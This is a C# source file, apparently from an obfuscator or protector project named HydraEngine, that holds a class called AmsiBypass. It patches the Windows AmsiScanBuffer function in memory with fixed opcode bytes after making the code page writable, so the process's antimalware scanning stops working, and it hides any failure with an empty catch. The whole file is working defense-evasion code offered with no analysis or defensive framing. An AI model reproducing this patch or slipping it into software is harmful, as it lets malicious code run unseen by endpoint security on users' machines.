using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace HydraEngine.Runtimes.Anti.Runtime
{
       internal static class AmsiBypass
    {


       private static  List<byte> GetPatch()
        {
             bool is64Bit = (IntPtr.Size == 8);
                 List<byte> result;
                if (is64Bit)
                {
                    result = new List<byte>()
                    {
                    184,
                    87,
                    0,
                    7,
                    128,
                    195
                    };
                }
                else
                {
                    result = new List<byte>()
                    {
                    184,
                    87,
                    0,
                    7,
                    128,
                    194,
                    24,
                    0
                    };
                }
                return result;
        }

        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private static void BypassAmsi()
        {
            try {
                IntPtr lib = LoadLibrary("amsi.dll");
                IntPtr asb = GetProcAddress(lib, "AmsiScanBuffer");
                byte[] patch = GetPatch().ToArray();
                uint oldProtect;
                VirtualProtect(asb, (UIntPtr)((ulong)((long)patch.Length)), 64U, out oldProtect);
                Marshal.Copy(patch, 0, asb, patch.Length);
                uint num;
                VirtualProtect(asb, (UIntPtr)((ulong)((long)patch.Length)), oldProtect, out num);
            } catch  { }
        }
    }
}
